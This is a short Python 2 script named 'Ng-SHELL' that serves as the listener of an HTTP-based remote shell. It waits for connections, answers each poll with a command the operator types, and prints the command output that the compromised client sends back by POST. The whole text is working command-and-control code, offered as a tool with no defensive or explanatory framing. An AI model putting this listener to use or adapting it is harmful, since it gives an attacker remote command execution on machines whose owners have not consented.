import socket, sys, os, time, urllib
from colorama import Fore, Back, Style
from threading import Thread
import urllib

http_response = """\
HTTP/1.1 200 OK

"""

print Back.BLACK
os.system('clear')
print Fore.RED
time.sleep(1)
os.system('figlet Ng-SHELL')
time.sleep(0.5)
print Fore.BLUE+'\n[+] Waiting for connection...\n'


so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
so.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
so.bind(('127.0.0.1',  int(sys.argv[1])))
so.listen(1)

def handle(msg, sock):
	global so
	if 'POST' in msg:
		try:
			print Fore.GREEN + urllib.unquote(msg.split('SPLITHERE')[1][1:]).decode('utf8').replace('\\n', '\n').replace('+', ' ')[2:-1]#.split('%')[0][:-1]
		except:
			print 'Output Error'
		finally:
			sock.close()
	else:
		try:
			sock.sendall(http_response+raw_input(Fore.RED+'[ng-shell] ~> '))
			sock.close()
		except Exception as x:
			so.close()
			sock.close()
			print x
			sys.exit()

def receive():
	global so
	sock, data = so.accept()
	dados = sock.recv(1024)
	handle(dados, sock)

try:
	while 1:
		receive()
except:
	so.close()
	sys.exit()
